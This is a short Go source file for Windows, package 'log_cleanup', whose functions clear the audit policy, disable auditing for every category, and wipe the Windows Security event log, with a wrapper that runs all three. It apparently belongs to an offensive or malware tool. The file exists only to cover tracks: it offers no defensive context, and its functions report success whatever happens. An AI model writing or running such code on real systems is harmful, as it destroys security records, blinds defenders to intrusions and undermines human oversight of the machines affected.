//go:build windows

package log_cleanup

import (
"os/exec"
)

func ClearAuditLogs() bool {
exec.Command("cmd", "/c", "auditpol /clear").Run()
return true
}

func DisableAuditPolicy() bool {
exec.Command("cmd", "/c", "auditpol /set /category:* /success:disable /failure:disable").Run()
return true
}

func ClearSecurityLog() bool {
exec.Command("cmd", "/c", "wevtutil cl Security").Run()
return true
}

func ClearAllAuditLogs() bool {
ClearAuditLogs()
DisableAuditPolicy()
ClearSecurityLog()
return true
}
